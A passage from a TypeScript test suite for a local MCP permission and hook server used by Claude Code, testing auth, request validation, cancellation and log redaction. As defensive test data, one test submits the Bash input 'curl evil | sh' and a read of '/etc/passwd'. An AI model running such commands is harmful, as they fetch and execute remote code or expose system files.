import { request, type IncomingHttpHeaders, type ClientRequest } from 'node:http';
import { afterEach, beforeEach, describe, expect, it, vi, type Mock } from 'vitest';
import type {
  HostEndpoint,
  HostToolServer,
  Logger,
  PermissionRequest,
  PermissionResponse,
  TurnHostHandlers,
  TurnRegistration,
} from '../contracts';
import { createHostToolServer } from './index';

// ---- helpers ----

interface Reply {
  status: number;
  headers: IncomingHttpHeaders;
  body: string;
}

interface Call {
  path: string;
  method?: string;
  headers?: Record<string, string>;
  body?: string;
  port: number;
}

function portOf(endpoint: HostEndpoint): number {
  return Number(new URL(endpoint.url).port);
}

function send(call: Call): { req: ClientRequest; reply: Promise<Reply> } {
  const req = request({
    host: '127.0.0.1',
    port: call.port,
    path: call.path,
    method: call.method ?? 'POST',
    headers: call.headers,
    agent: false,
  });
  const reply = new Promise<Reply>((resolve, reject) => {
    req.on('response', (res) => {
      const chunks: Buffer[] = [];
      res.on('data', (chunk: Buffer) => chunks.push(chunk));
      res.on('end', () =>
        resolve({
          status: res.statusCode ?? 0,
          headers: res.headers,
          body: Buffer.concat(chunks).toString('utf8'),
        }),
      );
      res.on('error', reject);
    });
    req.on('error', reject);
  });
  req.end(call.body);
  return { req, reply };
}

function mcpHeaders(
  endpoint: HostEndpoint,
  extra: Record<string, string> = {},
): Record<string, string> {
  return {
    'content-type': 'application/json',
    accept: 'application/json, text/event-stream',
    authorization: `Bearer ${endpoint.bearerToken}`,
    ...extra,
  };
}

function mcpCall(
  endpoint: HostEndpoint,
  message: unknown,
  extra: { headers?: Record<string, string>; raw?: string } = {},
): { req: ClientRequest; reply: Promise<Reply> } {
  return send({
    port: portOf(endpoint),
    path: new URL(endpoint.url).pathname,
    headers: mcpHeaders(endpoint, extra.headers),
    body: extra.raw ?? JSON.stringify(message),
  });
}

async function rpc(
  endpoint: HostEndpoint,
  method: string,
  params?: unknown,
  id: string | number = 1,
): Promise<{ reply: Reply; json: Record<string, unknown> }> {
  const { reply } = mcpCall(endpoint, { jsonrpc: '2.0', id, method, params });
  const r = await reply;
  return { reply: r, json: JSON.parse(r.body) as Record<string, unknown> };
}

function permissionCall(
  endpoint: HostEndpoint,
  args: unknown,
  extra: {
    id?: string | number;
    meta?: Record<string, unknown>;
    headers?: Record<string, string>;
  } = {},
): { req: ClientRequest; reply: Promise<Reply> } {
  return mcpCall(
    endpoint,
    {
      jsonrpc: '2.0',
      id: extra.id ?? 1,
      method: 'tools/call',
      params: { name: 'permission_prompt', arguments: args, _meta: extra.meta },
    },
    { headers: extra.headers },
  );
}

function resultText(json: Record<string, unknown>): string {
  const result = json.result as { content: { type: string; text: string }[] };
  return result.content[0]?.text ?? '';
}

function deferred<T>(): {
  promise: Promise<T>;
  resolve: (v: T) => void;
  reject: (e: unknown) => void;
} {
  let resolve!: (v: T) => void;
  let reject!: (e: unknown) => void;
  const promise = new Promise<T>((res, rej) => {
    resolve = res;
    reject = rej;
  });
  return { promise, resolve, reject };
}

async function waitFor(condition: () => boolean, ms = 3000): Promise<void> {
  const start = Date.now();
  while (!condition()) {
    if (Date.now() - start > ms) throw new Error('waitFor timed out');
    await new Promise((r) => setTimeout(r, 5));
  }
}

function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}

function parseSse(body: string): Record<string, unknown>[] {
  return body
    .split('\n\n')
    .filter((block) => block.trim() !== '')
    .map((block) => {
      expect(block).toMatch(/^event: message\ndata: /);
      return JSON.parse(block.slice(block.indexOf('data: ') + 6)) as Record<string, unknown>;
    });
}

const ARGS = { tool_name: 'Write', input: { file_path: '/a' }, tool_use_id: 'toolu_1' };

function recordingLogger(): { logger: Logger; lines: string[] } {
  const lines: string[] = [];
  const log = (level: string) => (message: string, data?: Record<string, unknown>) => {
    lines.push(`${level} ${message} ${JSON.stringify(data ?? {})}`);
  };
  return {
    logger: { debug: log('debug'), info: log('info'), warn: log('warn'), error: log('error') },
    lines,
  };
}

// ---- fixtures ----

let host: HostToolServer;
let logs: ReturnType<typeof recordingLogger>;
const registrations: TurnRegistration[] = [];

type PermissionSpy = Mock<(request: PermissionRequest) => Promise<PermissionResponse>>;

function register(
  overrides: Partial<TurnHostHandlers> = {},
  options: { plan?: Record<string, unknown>; hooks?: boolean } = {},
): {
  handlers: { onPermissionRequest: PermissionSpy };
  registration: TurnRegistration;
  endpoint: HostEndpoint;
} {
  const onPermissionRequest: PermissionSpy = vi.fn(
    overrides.onPermissionRequest ??
      (() => Promise.resolve<PermissionResponse>({ behavior: 'allow' })),
  );
  const registration = host.registerTurn(
    { ...overrides, onPermissionRequest },
    {
      toolHooks: options.hooks ?? false,
      ...(options.plan ? { planToolInputSchema: options.plan } : {}),
    },
  );
  registrations.push(registration);
  return { handlers: { onPermissionRequest }, registration, endpoint: registration.endpoint };
}

beforeEach(async () => {
  logs = recordingLogger();
  host = createHostToolServer({ logger: logs.logger, heartbeatMs: 40, maxBodyBytes: 4096 });
  await host.start();
});

afterEach(async () => {
  registrations.length = 0;
  await host.stop();
});

// ---- tests ----

describe('listening and registration', () => {
  it('start is idempotent and registerTurn before start throws', async () => {
    await host.start();
    const fresh = createHostToolServer();
    expect(() =>
      fresh.registerTurn({ onPermissionRequest: vi.fn() }, { toolHooks: false }),
    ).toThrow(/not started/);
    await fresh.stop();
  });

  it('returns the endpoint described by the contract', () => {
    const { endpoint } = register();
    expect(endpoint.serverName).toBe('agentcanopy');
    expect(endpoint.url).toMatch(/^http:\/\/127\.0\.0\.1:\d+\/mcp\/[\w-]+$/);
    expect(endpoint.bearerToken.length).toBeGreaterThan(20);
    expect(endpoint.permissionToolName).toBe('permission_prompt');
    expect(endpoint.planToolName).toBeUndefined();
    expect(endpoint.hookUrl).toBeUndefined();

    const full = register({}, { plan: { type: 'object' }, hooks: true }).endpoint;
    expect(full.planToolName).toBe('submit_plan');
    expect(full.hookUrl).toMatch(/^http:\/\/127\.0\.0\.1:\d+\/hook\/[\w-]+$/);
  });
});

describe('startup sequence of the CLI', () => {
  it('answers each step', async () => {
    const { endpoint } = register();
    const discover = await rpc(endpoint, 'server/discover', undefined, 'server-discover-probe-1');
    expect(discover.json).toMatchObject({
      id: 'server-discover-probe-1',
      error: { code: -32601 },
    });

    const init = await rpc(endpoint, 'initialize', { protocolVersion: '2025-11-25' });
    expect(init.reply.status).toBe(200);
    expect(init.json).toEqual({
      jsonrpc: '2.0',
      id: 1,
      result: {
        protocolVersion: '2025-11-25',
        capabilities: { tools: {} },
        serverInfo: { name: 'agentcanopy', version: '1' },
      },
    });
    const echoed = await rpc(endpoint, 'initialize', { protocolVersion: '1999-01-01' });
    expect((echoed.json.result as { protocolVersion: string }).protocolVersion).toBe('1999-01-01');
    const fallback = await rpc(endpoint, 'initialize', { protocolVersion: 5 });
    expect((fallback.json.result as { protocolVersion: string }).protocolVersion).toBe(
      '2025-11-25',
    );

    const note = await mcpCall(endpoint, {
      jsonrpc: '2.0',
      method: 'notifications/initialized',
    }).reply;
    expect(note.status).toBe(202);
    expect(note.body).toBe('');

    const get = await send({
      port: portOf(endpoint),
      path: new URL(endpoint.url).pathname,
      method: 'GET',
      headers: { accept: 'text/event-stream', authorization: `Bearer ${endpoint.bearerToken}` },
    }).reply;
    expect(get.status).toBe(405);
    expect(get.headers.allow).toBe('POST');

    const ping = await rpc(endpoint, 'ping');
    expect(ping.json.result).toEqual({});
  });

  it('lists the permission tool, and the plan tool only when registered', async () => {
    const without = await rpc(register().endpoint, 'tools/list');
    const toolsWithout = (without.json.result as { tools: { name: string }[] }).tools;
    expect(toolsWithout.map((t) => t.name)).toEqual(['permission_prompt']);
    expect(toolsWithout[0]).toMatchObject({
      description:
        'Internal. Called by the Claude Code runtime to request approval. Not for the assistant to call.',
      inputSchema: {
        type: 'object',
        properties: {
          tool_name: { type: 'string' },
          input: { type: 'object' },
          tool_use_id: { type: 'string' },
        },
        required: ['tool_name', 'input'],
        additionalProperties: true,
      },
    });

    const schema = { type: 'object', properties: { markdown: { type: 'string' } } };
    const withPlan = await rpc(register({}, { plan: schema }).endpoint, 'tools/list');
    const tools = (
      withPlan.json.result as {
        tools: { name: string; description: string; inputSchema: unknown }[];
      }
    ).tools;
    expect(tools.map((t) => t.name)).toEqual(['permission_prompt', 'submit_plan']);
    expect(tools[1]?.inputSchema).toEqual(schema);
    expect(tools[1]?.description).toMatch(/^Save the plan for the user to review\./);
    expect(tools[1]?.description).toContain('asked with AskUserQuestion before this call');
    expect(tools[1]?.description).toContain(
      'instead of listing them as decision points or open questions',
    );
  });
});

describe('permission_prompt', () => {
  it('allows without updatedInput, with the exact result shape', async () => {
    const { endpoint, handlers } = register();
    const { reply } = permissionCall(endpoint, ARGS);
    const r = await reply;
    expect(r.status).toBe(200);
    expect(r.headers['content-type']).toBe('application/json');
    expect(JSON.parse(r.body)).toEqual({
      jsonrpc: '2.0',
      id: 1,
      result: { content: [{ type: 'text', text: '{"behavior":"allow"}' }] },
    });
    expect(handlers.onPermissionRequest).toHaveBeenCalledTimes(1);
    const arg = vi.mocked(handlers.onPermissionRequest).mock.calls[0]?.[0];
    expect(arg).toMatchObject({
      toolCallId: 'toolu_1',
      toolName: 'Write',
      input: { file_path: '/a' },
    });
    expect(arg?.signal.aborted).toBe(false);
  });

  it('allows with updatedInput', async () => {
    const { endpoint } = register({
      onPermissionRequest: () =>
        Promise.resolve({ behavior: 'allow', updatedInput: { file_path: '/b' } }),
    });
    const r = await permissionCall(endpoint, ARGS).reply;
    expect(resultText(JSON.parse(r.body) as Record<string, unknown>)).toBe(
      '{"behavior":"allow","updatedInput":{"file_path":"/b"}}',
    );
  });

  it('denies with the handler message', async () => {
    const { endpoint } = register({
      onPermissionRequest: () => Promise.resolve({ behavior: 'deny', message: 'No.' }),
    });
    const r = await permissionCall(endpoint, ARGS).reply;
    const json = JSON.parse(r.body) as Record<string, unknown>;
    expect(resultText(json)).toBe('{"behavior":"deny","message":"No."}');
    expect(json.result).not.toHaveProperty('structuredContent');
  });

  it('denies when the handler rejects or throws, and logs the error', async () => {
    const rejecting = register({ onPermissionRequest: () => Promise.reject(new Error('boom')) });
    const throwing = register({
      onPermissionRequest: () => {
        throw new Error('sync boom');
      },
    });
    for (const { endpoint } of [rejecting, throwing]) {
      const r = await permissionCall(endpoint, ARGS).reply;
      expect(resultText(JSON.parse(r.body) as Record<string, unknown>)).toBe(
        '{"behavior":"deny","message":"AgentCanopy could not process this permission request."}',
      );
    }
    expect(logs.lines.filter((l) => l.startsWith('error '))).toHaveLength(2);
  });

  it('denies the host own tools without calling the handler', async () => {
    const { endpoint, handlers } = register();
    const r = await permissionCall(endpoint, {
      ...ARGS,
      tool_name: 'mcp__agentcanopy__submit_plan',
    }).reply;
    expect(resultText(JSON.parse(r.body) as Record<string, unknown>)).toBe(
      '{"behavior":"deny","message":"This tool cannot be approved through a permission request."}',
    );
    expect(handlers.onPermissionRequest).not.toHaveBeenCalled();
  });

  it('falls back to _meta for the tool call id, and denies when there is none', async () => {
    const { endpoint, handlers } = register();
    const { tool_use_id: _omit, ...noId } = ARGS;
    void _omit;
    const viaMeta = await permissionCall(endpoint, noId, {
      meta: { 'claudecode/toolUseId': 'toolu_meta' },
    }).reply;
    expect(resultText(JSON.parse(viaMeta.body) as Record<string, unknown>)).toBe(
      '{"behavior":"allow"}',
    );
    expect(vi.mocked(handlers.onPermissionRequest).mock.calls[0]?.[0].toolCallId).toBe(
      'toolu_meta',
    );

    const none = await permissionCall(endpoint, noId).reply;
    expect(resultText(JSON.parse(none.body) as Record<string, unknown>)).toBe(
      '{"behavior":"deny","message":"Permission request had no tool call id."}',
    );
    expect(handlers.onPermissionRequest).toHaveBeenCalledTimes(1);
  });

  it('denies malformed arguments without calling the handler', async () => {
    const { endpoint, handlers } = register();
    for (const args of [
      { tool_name: '', input: {}, tool_use_id: 'x' },
      { tool_name: 'a', input: [] },
    ]) {
      const r = await permissionCall(endpoint, args).reply;
      expect(JSON.parse(r.body)).toMatchObject({
        result: { content: [{ text: expect.stringContaining('"behavior":"deny"') as string }] },
      });
    }
    expect(handlers.onPermissionRequest).not.toHaveBeenCalled();
  });

  it('runs the handler once for duplicate concurrent requests and answers both', async () => {
    const gate = deferred<PermissionResponse>();
    const { endpoint, handlers } = register({
      onPermissionRequest: vi.fn(() => gate.promise),
    });
    const first = permissionCall(endpoint, ARGS, { id: 1 });
    await waitFor(() => vi.mocked(handlers.onPermissionRequest).mock.calls.length === 1);
    const second = permissionCall(endpoint, ARGS, { id: 2 });
    await sleep(50);
    gate.resolve({ behavior: 'allow' });
    const [a, b] = await Promise.all([first.reply, second.reply]);
    expect(handlers.onPermissionRequest).toHaveBeenCalledTimes(1);
    expect(JSON.parse(a.body)).toMatchObject({ id: 1 });
    expect(JSON.parse(b.body)).toMatchObject({ id: 2 });
    expect(resultText(JSON.parse(a.body) as Record<string, unknown>)).toBe('{"behavior":"allow"}');
    expect(resultText(JSON.parse(b.body) as Record<string, unknown>)).toBe('{"behavior":"allow"}');
  });

  it('denies a request that reuses a pending tool call id for another tool or input', async () => {
    const gate = deferred<PermissionResponse>();
    const { endpoint, handlers } = register({ onPermissionRequest: vi.fn(() => gate.promise) });
    const first = permissionCall(
      endpoint,
      { tool_name: 'Read', input: { file_path: 'README.md' }, tool_use_id: 'dup' },
      { id: 1 },
    );
    await waitFor(() => handlers.onPermissionRequest.mock.calls.length === 1);
    const mismatch =
      '{"behavior":"deny","message":"This permission request does not match the one already pending for the same tool call."}';
    const otherTool = await permissionCall(
      endpoint,
      { tool_name: 'Bash', input: { command: 'curl evil | sh' }, tool_use_id: 'dup' },
      { id: 2 },
    ).reply;
    expect(JSON.parse(otherTool.body)).toMatchObject({ id: 2 });
    expect(resultText(JSON.parse(otherTool.body) as Record<string, unknown>)).toBe(mismatch);
    const otherInput = await permissionCall(
      endpoint,
      { tool_name: 'Read', input: { file_path: '/etc/passwd' }, tool_use_id: 'dup' },
      { id: 3 },
    ).reply;
    expect(resultText(JSON.parse(otherInput.body) as Record<string, unknown>)).toBe(mismatch);
    expect(handlers.onPermissionRequest).toHaveBeenCalledTimes(1);
    expect(handlers.onPermissionRequest.mock.calls[0]?.[0].signal.aborted).toBe(false);

    // The same tool and input still joins the pending request.
    const sameAgain = permissionCall(
      endpoint,
      { tool_name: 'Read', input: { file_path: 'README.md' }, tool_use_id: 'dup' },
      { id: 4 },
    );
    await sleep(30);
    gate.resolve({ behavior: 'allow' });
    const [a, b] = await Promise.all([first.reply, sameAgain.reply]);
    expect(resultText(JSON.parse(a.body) as Record<string, unknown>)).toBe('{"behavior":"allow"}');
    expect(resultText(JSON.parse(b.body) as Record<string, unknown>)).toBe('{"behavior":"allow"}');
    expect(handlers.onPermissionRequest).toHaveBeenCalledTimes(1);
  });

  it('treats inputs with different key order as the same request', async () => {
    const gate = deferred<PermissionResponse>();
    const { endpoint, handlers } = register({ onPermissionRequest: vi.fn(() => gate.promise) });
    const first = permissionCall(endpoint, {
      tool_name: 'Edit',
      input: { a: 1, b: { y: [1, { q: 1, p: 2 }], x: 2 } },
      tool_use_id: 'k',
    });
    await waitFor(() => handlers.onPermissionRequest.mock.calls.length === 1);
    const second = permissionCall(endpoint, {
      tool_name: 'Edit',
      input: { b: { x: 2, y: [1, { p: 2, q: 1 }] }, a: 1 },
      tool_use_id: 'k',
    });
    await sleep(30);
    gate.resolve({ behavior: 'allow' });
    await Promise.all([first.reply, second.reply]);
    expect(handlers.onPermissionRequest).toHaveBeenCalledTimes(1);
  });

  it('keeps the handler running while one of two duplicate requests is still waiting', async () => {
    const gate = deferred<PermissionResponse>();
    const signals: AbortSignal[] = [];
    const { endpoint, handlers } = register({
      onPermissionRequest: vi.fn((r: PermissionRequest) => {
        signals.push(r.signal);
        return gate.promise;
      }),
    });
    const first = permissionCall(endpoint, ARGS, { id: 1 });
    first.reply.catch(() => undefined);
    await waitFor(() => signals.length === 1);
    const second = permissionCall(endpoint, ARGS, { id: 2 });
    await sleep(50);
    first.req.destroy();
    await sleep(50);
    expect(signals[0]?.aborted).toBe(false);
    gate.resolve({ behavior: 'allow' });
    const b = await second.reply;
    expect(resultText(JSON.parse(b.body) as Record<string, unknown>)).toBe('{"behavior":"allow"}');
    expect(handlers.onPermissionRequest).toHaveBeenCalledTimes(1);
  });
});

describe('reply transport', () => {
  it('streams progress messages and then the response when a progress token is given', async () => {
    const gate = deferred<PermissionResponse>();
    const { endpoint, handlers } = register({ onPermissionRequest: vi.fn(() => gate.promise) });
    const call = permissionCall(endpoint, ARGS, { meta: { progressToken: 'tok-1' }, id: 9 });
    await waitFor(() => vi.mocked(handlers.onPermissionRequest).mock.calls.length === 1);
    await sleep(200);
    gate.resolve({ behavior: 'allow' });
    const r = await call.reply;
    expect(r.status).toBe(200);
    expect(r.headers['content-type']).toBe('text/event-stream');
    const messages = parseSse(r.body);
    const progress = messages.filter((m) => m.method === 'notifications/progress');
    expect(progress.length).toBeGreaterThanOrEqual(2);
    expect(progress[0]).toEqual({
      jsonrpc: '2.0',
      method: 'notifications/progress',
      params: { progressToken: 'tok-1', progress: 1 },
    });
    expect((progress[1]?.params as { progress: number }).progress).toBe(2);
    const last = messages[messages.length - 1];
    expect(last).toMatchObject({ jsonrpc: '2.0', id: 9 });
    expect(resultText(last ?? {})).toBe('{"behavior":"allow"}');
  });

  it('accepts a numeric progress token', async () => {
    const { endpoint } = register();
    const r = await permissionCall(endpoint, ARGS, { meta: { progressToken: 3 } }).reply;
    expect(r.headers['content-type']).toBe('text/event-stream');
  });

  it('answers plain JSON without a progress token or without the SSE accept', async () => {
    const { endpoint } = register();
    const noToken = await permissionCall(endpoint, ARGS).reply;
    expect(noToken.headers['content-type']).toBe('application/json');
    const noAccept = await permissionCall(endpoint, ARGS, {
      meta: { progressToken: 'x' },
      headers: { accept: 'application/json' },
    }).reply;
    expect(noAccept.headers['content-type']).toBe('application/json');
  });
});

describe('aborting a pending permission request', () => {
  function pending(): {
    endpoint: HostEndpoint;
    registration: TurnRegistration;
    started: Promise<PermissionRequest>;
    answer: (r: PermissionResponse) => void;
  } {
    const gate = deferred<PermissionResponse>();
    const started = deferred<PermissionRequest>();
    const { endpoint, registration } = register({
      onPermissionRequest: (r) => {
        started.resolve(r);
        return gate.promise;
      },
    });
    return { endpoint, registration, started: started.promise, answer: gate.resolve };
  }

  it('fires the signal when the client disconnects and ignores a late answer', async () => {
    const p = pending();
    const call = permissionCall(p.endpoint, ARGS);
    call.reply.catch(() => undefined);
    const request = await p.started;
    expect(request.signal.aborted).toBe(false);
    call.req.destroy();
    await waitFor(() => request.signal.aborted);
    p.answer({ behavior: 'allow' });
    await sleep(50);
    expect(logs.lines.filter((l) => l.startsWith('error '))).toEqual([]);
    const ok = await rpc(p.endpoint, 'ping');
    expect(ok.json.result).toEqual({});
  });

  it('fires the signal on notifications/cancelled and discards the late answer', async () => {
    const p = pending();
    const call = permissionCall(p.endpoint, ARGS, { id: 42 });
    const request = await p.started;
    const note = await mcpCall(p.endpoint, {
      jsonrpc: '2.0',
      method: 'notifications/cancelled',
      params: { requestId: 42, reason: 'AbortError: user-cancel' },
    }).reply;
    expect(note.status).toBe(202);
    await waitFor(() => request.signal.aborted);
    const r = await call.reply;
    expect(r.body).not.toContain('behavior');
    p.answer({ behavior: 'allow' });
    await sleep(50);
    expect(logs.lines.filter((l) => l.startsWith('error '))).toEqual([]);
  });

  it('cancelling an unknown request id is harmless', async () => {
    const { endpoint } = register();
    const note = await mcpCall(endpoint, {
      jsonrpc: '2.0',
      method: 'notifications/cancelled',
      params: { requestId: 'nope' },
    }).reply;
    expect(note.status).toBe(202);
  });

  it('dispose fires the signal, ends the response, and later requests get 404', async () => {
    const p = pending();
    const call = permissionCall(p.endpoint, ARGS, { meta: { progressToken: 't' } });
    const request = await p.started;
    p.registration.dispose();
    expect(request.signal.aborted).toBe(true);
    const r = await call.reply;
    expect(r.body).not.toContain('"behavior"');
    const later = await rpc(p.endpoint, 'ping');
    expect(later.reply.status).toBe(404);
    p.answer({ behavior: 'allow' });
    p.registration.dispose();
  });

  it('stop resolves with a request pending and fires the signal', async () => {
    const p = pending();
    const call = permissionCall(p.endpoint, ARGS);
    call.reply.catch(() => undefined);
    const request = await p.started;
    await host.stop();
    expect(request.signal.aborted).toBe(true);
    p.answer({ behavior: 'allow' });
  });

  it('can start again after stop', async () => {
    await host.stop();
    await host.start();
    const { endpoint } = register();
    expect((await rpc(endpoint, 'ping')).json.result).toEqual({});
  });
});

describe('request checks', () => {
  it('rejects a wrong or missing token with 401', async () => {
    const { endpoint } = register();
    const body = JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'ping' });
    const path = new URL(endpoint.url).pathname;
    const port = portOf(endpoint);
    const base = { 'content-type': 'application/json' };
    expect((await send({ port, path, body, headers: base }).reply).status).toBe(401);
    expect(
      (await send({ port, path, body, headers: { ...base, authorization: 'Bearer wrong' } }).reply)
        .status,
    ).toBe(401);
    expect(
      (
        await send({
          port,
          path,
          body,
          headers: { ...base, authorization: endpoint.bearerToken },
        }).reply
      ).status,
    ).toBe(401);
  });

  it('rejects a wrong Host with 403', async () => {
    const { endpoint } = register();
    const r = await mcpCall(
      endpoint,
      { jsonrpc: '2.0', id: 1, method: 'ping' },
      {
        headers: { host: 'localhost:1' },
      },
    ).reply;
    expect(r.status).toBe(403);
    const noPort = await mcpCall(
      endpoint,
      { jsonrpc: '2.0', id: 1, method: 'ping' },
      {
        headers: { host: '127.0.0.1' },
      },
    ).reply;
    expect(noPort.status).toBe(403);
  });

  it('rejects any Origin header with 403', async () => {
    const { endpoint } = register();
    const r = await mcpCall(
      endpoint,
      { jsonrpc: '2.0', id: 1, method: 'ping' },
      {
        headers: { origin: 'http://evil.example' },
      },
    ).reply;
    expect(r.status).toBe(403);
  });

  it('rejects a wrong content type with 415', async () => {
    const { endpoint } = register();
    const r = await mcpCall(
      endpoint,
      { jsonrpc: '2.0', id: 1, method: 'ping' },
      {
        headers: { 'content-type': 'text/plain' },
      },
    ).reply;
    expect(r.status).toBe(415);
    const withCharset = await mcpCall(
      endpoint,
      { jsonrpc: '2.0', id: 1, method: 'ping' },
      {
        headers: { 'content-type': 'application/json; charset=utf-8' },
      },
    ).reply;
    expect(withCharset.status).toBe(200);
  });

  it('rejects a body over the cap with 413 and destroys the socket', async () => {
    const { endpoint } = register();
    const raw = JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'ping', pad: 'x'.repeat(5000) });
    const r = await mcpCall(endpoint, undefined, { raw }).reply;
    expect(r.status).toBe(413);
    expect(r.headers.connection).toBe('close');
    expect((await rpc(endpoint, 'ping')).json.result).toEqual({});
  });

  it('answers invalid JSON with -32700 and a batch with -32600', async () => {
    const { endpoint } = register();
    const bad = await mcpCall(endpoint, undefined, { raw: '{not json' }).reply;
    expect(JSON.parse(bad.body)).toEqual({
      jsonrpc: '2.0',
      id: null,
      error: { code: -32700, message: 'Parse error' },
    });
    const notObject = await mcpCall(endpoint, undefined, { raw: '42' }).reply;
    expect(JSON.parse(notObject.body)).toMatchObject({ id: null, error: { code: -32700 } });
    const batch = await mcpCall(endpoint, [{ jsonrpc: '2.0', id: 1, method: 'ping' }]).reply;
    expect(JSON.parse(batch.body)).toMatchObject({ id: null, error: { code: -32600 } });
    const noMethod = await mcpCall(endpoint, { jsonrpc: '2.0', id: 4 }).reply;
    expect(JSON.parse(noMethod.body)).toMatchObject({ id: 4, error: { code: -32600 } });
  });

  it('returns 405 with Allow for GET and DELETE and 404 for unknown paths', async () => {
    const { endpoint } = register();
    for (const method of ['GET', 'DELETE']) {
      const r = await send({
        port: portOf(endpoint),
        path: new URL(endpoint.url).pathname,
        method,
      }).reply;
      expect(r.status).toBe(405);
      expect(r.headers.allow).toBe('POST');
    }
    const port = portOf(endpoint);
    const headers = mcpHeaders(endpoint);
    expect((await send({ port, path: '/mcp/unknown', headers, body: '{}' }).reply).status).toBe(
      404,
    );
    expect((await send({ port, path: '/other', headers, body: '{}' }).reply).status).toBe(404);
    expect((await send({ port, path: '/', method: 'GET' }).reply).status).toBe(404);
  });

  it('does not let one registration token work on another route', async () => {
    const a = register().endpoint;
    const b = register().endpoint;
    const r = await send({
      port: portOf(b),
      path: new URL(b.url).pathname,
      headers: mcpHeaders(a),
      body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'ping' }),
    }).reply;
    expect(r.status).toBe(401);
  });

  it('never sends Access-Control headers and never reflects the request in errors', async () => {
    const { endpoint } = register({}, { hooks: true });
    const marker = 'MARKER_7f3a';
    const body = JSON.stringify({ jsonrpc: '2.0', id: 5, method: marker, params: { x: marker } });
    const port = portOf(endpoint);
    const path = new URL(endpoint.url).pathname;
    const replies: Reply[] = [
      await mcpCall(endpoint, undefined, { raw: body }).reply,
      await mcpCall(endpoint, undefined, { raw: `{${marker}` }).reply,
      await mcpCall(endpoint, undefined, {
        raw: body,
        headers: { authorization: `Bearer ${marker}` },
      }).reply,
      await mcpCall(endpoint, undefined, { raw: body, headers: { 'content-type': marker } }).reply,
      await mcpCall(endpoint, undefined, { raw: body, headers: { origin: marker } }).reply,
      await mcpCall(endpoint, undefined, { raw: body, headers: { host: marker } }).reply,
      await mcpCall(endpoint, undefined, {
        raw: JSON.stringify({
          jsonrpc: '2.0',
          id: 6,
          method: 'tools/call',
          params: { name: marker },
        }),
      }).reply,
      await send({ port, path: `/mcp/${marker}`, headers: mcpHeaders(endpoint), body }).reply,
      await send({ port, path, method: 'GET' }).reply,
      await send({ port, path: `/hook/${marker}/pre`, headers: mcpHeaders(endpoint), body }).reply,
    ];
    for (const r of replies) {
      expect(r.body).not.toContain(marker);
      expect(Object.keys(r.headers).filter((h) => h.startsWith('access-control-'))).toEqual([]);
    }
    const ok = await rpc(endpoint, 'ping');
    expect(Object.keys(ok.reply.headers).filter((h) => h.startsWith('access-control-'))).toEqual(
      [],
    );
  });

  it('does not log tokens, inputs or bodies', async () => {
    const { endpoint } = register({}, { hooks: true });
    await permissionCall(endpoint, {
      tool_name: 'Write',
      input: { content: 'INPUT_SECRET_91' },
      tool_use_id: 't1',
    }).reply;
    await rpc(endpoint, 'ping');
    const hookUrl = new URL(endpoint.hookUrl ?? '');
    await send({
      port: Number(hookUrl.port),
      path: `${hookUrl.pathname}/pre`,
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ tool_name: 'Bash', tool_use_id: 'h1', tool_input: 'INPUT_SECRET_91' }),
    }).reply;
    const all = logs.lines.join('\n');
    expect(all).toContain('Write');
    expect(all).toContain('Bash');
    expect(all).not.toContain('INPUT_SECRET_91');
    expect(all).not.toContain(endpoint.bearerToken);
    expect(all).not.toContain(hookUrl.pathname.split('/')[2] ?? 'unreachable');
    expect(all).not.toContain(new URL(endpoint.url).pathname.split('/')[2] ?? 'unreachable');
  });
});

describe('plan tool', () => {
  const schema = { type: 'object', properties: { markdown: { type: 'string' } } };
  const call = (endpoint: HostEndpoint, args: unknown) =>
    rpc(endpoint, 'tools/call', { name: 'submit_plan', arguments: args });

  it('passes the arguments to the handler and returns its text', async () => {
    const onPlanSubmitted = vi.fn(() => Promise.resolve({ text: 'Saved.', isError: false }));
    const { endpoint } = register({ onPlanSubmitted }, { plan: schema });
    const { json } = await call(endpoint, { markdown: '# Plan' });
    expect(onPlanSubmitted).toHaveBeenCalledWith({ markdown: '# Plan' });
    expect(json.result).toEqual({ content: [{ type: 'text', text: 'Saved.' }], isError: false });
  });

  it('relays a handler error result', async () => {
    const { endpoint } = register(
      { onPlanSubmitted: () => Promise.resolve({ text: 'Invalid plan.', isError: true }) },
      { plan: schema },
    );
    const { json } = await call(endpoint, {});
    expect(json.result).toEqual({
      content: [{ type: 'text', text: 'Invalid plan.' }],
      isError: true,
    });
  });

  it('reports a handler failure as isError', async () => {
    const { endpoint } = register(
      { onPlanSubmitted: () => Promise.reject(new Error('disk full')) },
      { plan: schema },
    );
    const { json } = await call(endpoint, {});
    expect(json.result).toEqual({
      content: [{ type: 'text', text: 'The plan could not be saved.' }],
      isError: true,
    });
    expect(logs.lines.some((l) => l.startsWith('error '))).toBe(true);
  });

  it('answers -32602 for submit_plan on a registration without it, and for unknown tools', async () => {
    const { endpoint } = register();
    expect((await call(endpoint, {})).json).toMatchObject({ error: { code: -32602 } });
    const unknown = await rpc(endpoint, 'tools/call', { name: 'nope', arguments: {} });
    expect(unknown.json).toMatchObject({ error: { code: -32602 } });
    const noName = await rpc(endpoint, 'tools/call');
    expect(noName.json).toMatchObject({ error: { code: -32602 } });
  });
});

describe('hooks', () => {
  function hookCall(
    endpoint: HostEndpoint,
    phase: string,
    body: string,
    headers: Record<string, string> = { 'content-type': 'application/json' },
  ): Promise<Reply> {
    const url = new URL(endpoint.hookUrl ?? '');
    return send({ port: Number(url.port), path: `${url.pathname}/${phase}`, headers, body }).reply;
  }

  it('reaches the handler with mapped fields and waits for it', async () => {
    const gate = deferred<void>();
    const onToolHook = vi.fn(() => gate.promise);
    const { endpoint } = register({ onToolHook }, { hooks: true });
    let replied = false;
    const pre = hookCall(
      endpoint,
      'pre',
      JSON.stringify({
        session_id: 's',
        tool_name: 'Write',
        tool_use_id: 'toolu_9',
        tool_input: { file_path: '/x' },
      }),
    ).then((r) => {
      replied = true;
      return r;
    });
    await waitFor(() => onToolHook.mock.calls.length === 1);
    await sleep(50);
    expect(replied).toBe(false);
    gate.resolve();
    const r = await pre;
    expect(r.status).toBe(200);
    expect(JSON.parse(r.body)).toEqual({});
    expect(onToolHook).toHaveBeenCalledWith({
      phase: 'pre',
      toolCallId: 'toolu_9',
      toolName: 'Write',
      input: { file_path: '/x' },
    });

    await hookCall(
      endpoint,
      'post',
      JSON.stringify({ tool_name: 'Bash', tool_use_id: 'toolu_10', tool_input: 'ls' }),
    );
